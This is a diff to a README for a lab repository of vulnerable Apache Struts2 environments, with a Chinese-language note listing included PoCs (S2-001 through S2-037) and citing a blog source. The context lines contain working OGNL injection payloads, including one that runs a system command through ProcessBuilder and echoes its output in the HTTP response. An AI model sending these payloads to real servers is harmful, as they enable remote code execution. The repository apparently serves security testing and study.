@@ -1,5 +1,6 @@
 # Struts2Environment
-Struts2 历史版本的漏洞环境
+Struts2 历史版本的漏洞环境,PoC暂时弄了S2-001,S2-005,S2-009,S2-016,S2-032,S2-037
+下文来自http://blog.0kami.cn/2017/01/13/Struts2-history-payload/
 # PoC
 ## Struts2 S2-001
     影响版本：2.0.0 - 2.0.8
@@ -123,3 +124,5 @@ person.name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang
 ```
 /(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&a=whoami&b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&c=flag:
 ```
+
+
